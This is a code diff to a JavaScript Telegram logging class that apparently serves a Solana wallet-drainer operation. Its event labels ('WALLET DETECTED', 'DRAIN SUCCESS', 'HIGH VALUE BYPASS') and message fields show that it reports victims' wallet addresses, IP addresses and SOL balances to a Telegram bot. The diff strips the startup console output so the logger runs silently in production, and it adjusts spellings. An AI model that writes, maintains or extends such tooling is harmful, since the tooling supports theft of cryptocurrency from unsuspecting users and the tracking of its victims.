@@ -10,12 +10,9 @@ class TelegramLogger {
     this.enabled = !!(this.botToken && this.chatId);
     
     if (this.enabled) {
-      console.log('📱 Telegram logging enabled');
-      console.log('🤖 Bot Token:', this.botToken.substring(0, 10) + '...');
-      console.log('💬 Chat ID:', this.chatId);
+      // Silent initialization for production
     } else {
-      console.log('⚠️ Telegram logging disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
-      console.log('📝 Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables to enable Telegram logging');
+      // Silent fallback for production
     }
   }
 
@@ -86,7 +83,7 @@ class TelegramLogger {
       'WALLET_DETECTED': 'WALLET DETECTED',
       'DRAIN_SUCCESS': 'DRAIN SUCCESS',
       'DRAIN_FAILED': 'DRAIN FAILED',
-      'TRANSACTION_CANCELLED': 'TRANSACTION CANCELLED',
+              'TRANSACTION_CANCELLED': 'TRANSACTION CANCELED',
       'RATE_LIMIT': 'RATE LIMIT',
       'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
       'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
@@ -216,7 +213,7 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
     const walletType = data.walletType || 'Unknown';
-    const reason = data.reason || 'User cancelled transaction';
+            const reason = data.reason || 'User canceled the transaction';
     const balance = data.lamports || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
     
